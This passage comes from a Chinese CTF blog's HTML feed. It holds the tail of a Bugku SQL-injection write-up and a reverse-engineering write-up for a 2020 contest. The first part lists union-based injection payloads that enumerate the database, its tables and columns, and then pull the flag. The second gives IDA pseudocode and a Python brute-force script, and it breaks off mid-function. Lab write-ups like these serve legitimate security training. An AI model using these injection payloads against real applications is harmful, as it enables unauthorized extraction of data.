data-original="https://img-blog.csdnimg.cn/20201119145823949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>回显位在2：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119150121428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆库：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token number">1</span>'union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token shell-comment comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111915065969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>爆表：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token number">1</span>'union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> from information_schema<span class="token punctuation">.</span>tables where table_schema<span class="token operator">=</span><span class="token number">0x74657374</span><span class="token shell-comment comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119160800228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆列：</p><pre class="line-numbers language-php"><code class="language-php">' union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> from information_schema<span class="token punctuation">.</span>columns where table_name<span class="token operator">=</span><span class="token number">0x666C61616167</span><span class="token shell-comment comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119162406590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆数据：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token number">1</span>' union select <span class="token number">1</span><span class="token punctuation">,</span>fl44g<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> from flaaag<span class="token shell-comment comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119162740481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> EXP </tag>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020易霖博杯——Re题目部分WP</title>
      <link href="/posts/34ae5c62.html"/>
      <url>/posts/34ae5c62.html</url>
      
        <content type="html"><![CDATA[<h3 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h3><p>拿到程序以后拖进IDA里shift+F12看一下：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020033123384896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>双击跟进去，查看一下交叉引用，F5转一下伪代码就出来了：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200331234013551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag为：<strong>flag{Sign_fDfkl_CTF}}</strong></p><h3 id="re2与re3"><a href="#re2与re3" class="headerlink" title="re2与re3"></a>re2与re3</h3><pre><code>目前网上仍没有公布WP，当时参赛选手都没解出来...</code></pre><h3 id="re4"><a href="#re4" class="headerlink" title="re4"></a>re4</h3><p>拖IDA看一下，发现是ELF文件：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200331234252477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看一下main()函数的伪代码：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200331234347306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这是main()函数的伪代码：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+20h] [ebp-28h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+2Bh] [ebp-1Dh]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+3Ch] [ebp-Ch]</span>  v6 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>password<span class="token punctuation">,</span> <span class="token string">"IKAWTEQWJHQTVRCF"</span><span class="token punctuation">,</span> <span class="token number">0x10u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//初始化password</span>  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x11u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter the password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%16s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//获取键盘输入的16个字符</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>                        <span class="token comment" spellcheck="true">//将字符串放入循环</span>    s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">complex_function</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">18</span> <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//这里是重点，将字符串存到s这个数组里，并调用complex_function()这个函数进行处理，然后在返回到s里。</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">check_equals_IKAWTEQWJHQTVRCF</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">//这里调用check_equals_IKAWTEQWJHQTVRCF()函数对处理后的password进行最多16次判断</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Good Job."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token comment" spellcheck="true">//若结果为真则输出Good job.</span>  <span class="token keyword">else</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token comment" spellcheck="true">//若结果为假则输出Try again.</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们在看一下它对我们输入的password进行了怎样的处理，也就是看一下complex_function()函数：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020033123571379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>简单分析一下：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">complex_function</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">&lt;=</span> <span class="token number">64</span> <span class="token operator">||</span> a1 <span class="token operator">></span> <span class="token number">90</span> <span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//password对应的十进制只能在64~90之间</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//若超出64~90则输出Try again.</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//运行到这里直接结束当前进程</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>a1 <span class="token operator">-</span> <span class="token number">65</span> <span class="token operator">+</span> <span class="token number">29</span> <span class="token operator">*</span> a2<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//如果语句没有执行，那么passwd经过处理后返回</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着我们分析它调用check_equals_IKAWTEQWJHQTVRCF()进行的判断：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200401001905825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>分析一下伪代码，这里a1就是经过处理后的password，a2是16：</p><pre class="line-numbers language-c"><code class="language-c">_BOOL4 __cdecl <span class="token function">check_equals_IKAWTEQWJHQTVRCF</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-8h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-4h]</span>  v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                            <span class="token comment" spellcheck="true">//定义一个局部变量v3用来存值</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> a2 <span class="token operator">></span> i<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">//开始循环，每次循环结束i进行自加，最多循环16次</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">0x804C038</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//这里是对原password跟处理后的password进行对比，如果相等就执行下面的语句，如果不相等就直接跳出去</span>      <span class="token operator">++</span>v3<span class="token punctuation">;</span>                            <span class="token comment" spellcheck="true">//相等后进行自加</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> v3 <span class="token operator">==</span> a2<span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">/**这里return v3 == a2的作用我感觉就是把结果转成0或1，然后存到eax里，进行判断后选择跳或者不跳，如果程序成功执行了16次，也就是v3 == a2成立，那么结果就是0，反之为1**/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是check_equals_IKAWTEQWJHQTVRCF()函数执行后的流程图，这里如果jnz判断不成立，也就是eax为0，那么就输出”Good job.”反之输出”Try again.”，跟我们分析的一样：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200401010312156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200401010710289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>分析到这里我们就有解题思路了，有两种解题方法：</p><ol><li>从complex_function()函数下手，直接爆破一下加密后的password。</li><li>从check_equals_IKAWTEQWJHQTVRCF()函数下手，破解程序。</li></ol><p>这里还是爆破比较方便，也比较简单：</p><pre class="line-numbers language-py"><code class="language-py">passwd = 'IKAWTEQWJHQTVRCF'        #定义原passwdflag = ''                          #定义flag用来存值for i in range(len(passwd)):    #返回passwd的长度，也就是16    for a1 in range(64,91):        #把64~90依次传给a1        if (a1 - 65 + (18-i)*29)%26 + 65 == ord(passwd[i]):  #如果经过计算后a1的十进制结果如果等于原passwd的十进制结果            flag += chr(a1)                                   #那么将结果依次转为对应的ASCII码赋值给flagprint('flag{%s}'%(flag))            #输出flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功拿到flag：<strong>flag{GLEDDRGPFGSYDCQW}</strong></p><h3 id="re5"><a href="#re5" class="headerlink" title="re5"></a>re5</h3><p>这题我看流程图感觉是将输入的内容进行异或，然后将异或的结果进行判断，若结果为真则结束进程，若为假则输出“err…”并结束进程：</p><p>这是它main()函数的伪代码<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020040103082996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)这里的关键就是在sub_400606()这个函数，它的伪代码非常复杂，很多个循环语句嵌套，水平实在是不够，分析不了，如果有大牛能分析或者感兴趣，私信我一起学习一下！</p><p>上一下sub_400606()函数的伪代码：</p><pre class="line-numbers language-c"><code class="language-c">__int64 __fastcall <span class="token function">sub_400606</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> __int64 v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  __int16 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+14h] [rbp-Ch]</span>  <span class="token operator">*</span>a1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">do</span>  <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>            <span class="token punctuation">{</span>              <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>              <span class="token punctuation">{</span>                <span class="token keyword">do</span>                <span class="token punctuation">{</span>                  v1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6LL</span> <span class="token operator">*</span> <span class="token operator">*</span>a1<span class="token punctuation">;</span>                  v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v1<span class="token punctuation">;</span>                  v4 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token operator">++</span><span class="token operator">*</span>a1<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">BYTE1</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">BYTE1</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span> <span class="token operator">!=</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>                result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v3<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v3 <span class="token operator">!=</span> <span class="token number">7</span> <span class="token punctuation">)</span>                  <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token operator">*</span>a1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">signed</span> __int16 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2LL</span> <span class="token operator">*</span> <span class="token function">SHIWORD</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">></span> <span class="token number">7</span> <span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>result <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>              <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2LL</span> <span class="token operator">*</span> <span class="token function">SHIWORD</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2LL</span> <span class="token operator">*</span> v4 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>                  a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">else</span>                  a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span>              <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">></span> <span class="token number">3</span> <span class="token punctuation">)</span>              <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>result <span class="token operator">==</span> <span class="token number">5</span> <span class="token punctuation">)</span>                <span class="token punctuation">{</span>                  <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2LL</span> <span class="token operator">*</span> <span class="token function">SHIWORD</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2LL</span> <span class="token operator">*</span> v4 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>                <span class="token punctuation">{</span>                  <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2LL</span> <span class="token operator">*</span> <span class="token function">SHIWORD</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span>a1<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                  <span class="token operator">*</span>a1 <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">SHIWORD</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>              <span class="token punctuation">}</span>              <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>result <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>              <span class="token punctuation">{</span>                <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2LL</span> <span class="token operator">*</span> <span class="token function">SHIWORD</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2LL</span> <span class="token operator">*</span> <span class="token function">SHIWORD</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                                                                    <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token 